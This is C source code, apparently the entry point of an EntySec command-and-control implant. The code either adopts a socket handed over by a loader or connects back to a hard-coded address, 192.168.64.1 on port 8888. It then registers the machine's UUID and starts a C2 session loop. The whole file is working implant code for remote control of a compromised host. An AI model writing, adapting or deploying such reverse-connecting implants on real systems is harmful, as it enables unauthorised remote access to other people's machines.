/*
 * MIT License
 *
 * Copyright (c) 2020-2023 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include <c2.h>
#include <machine.h>

int connect_to(char *host, int port)
{
    int sockfd;
    struct sockaddr_in hint;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1)
        return -1;

    hint.sin_family = AF_INET;
    hint.sin_port = htons(port);
    hint.sin_addr.s_addr = inet_addr(host);

    if (connect(sockfd, (struct sockaddr *)&hint, sizeof(hint)) != 0)
        return -1;

    return sockfd;
}

int main(int argc, char *argv[])
{
    c2_t *c2;

    int fd;
    char uuid[UUID_SIZE];

    c2 = NULL;

    if (strcmp(argv[0], "p") == 0)
    {
        fd = (int)((long *)argv)[1];

        if (machine_uuid(uuid) < 0)
            return 1;

        c2_add(&c2, 0, fd, uuid);
    }
    else
    {
        fd = connect_to("192.168.64.1", 8888);

        if (fd < 0)
            return 1;

        if (machine_uuid(uuid) < 0)
            return 1;

        c2_add(&c2, 0, fd, uuid);
    }

    c2_init(c2);

    return 0;
}